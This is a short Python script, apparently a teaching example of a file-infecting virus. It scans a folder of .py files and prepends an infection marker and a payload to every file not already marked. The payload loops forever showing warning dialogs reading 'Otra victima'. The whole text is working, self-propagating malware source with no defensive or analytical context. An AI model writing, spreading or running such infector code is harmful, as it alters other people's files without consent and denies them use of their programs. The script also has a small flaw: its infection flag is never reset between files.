import glob
virus='''
import tkinter as tk
from tkinter import messagebox

root=tk.Tk()
root.withdraw()
while True:
    messagebox.showwarning('Otra victima')
'''

infeccion='## Infected ##'
es_infeccion=False

archivos=glob.glob('ficheros_infectar/*.py')

for archivo in archivos:
    f=open(archivo, 'r')
    code=f.readlines()
    f.close()
    for line in code:
        if infeccion in line:
            es_infeccion=True
            break

    if not es_infeccion:
        new_archivo=open(archivo, 'w')
        new_archivo.write(infeccion + '\n')
        new_archivo.write(virus)
        new_archivo.writelines(code)
        new_archivo.close()    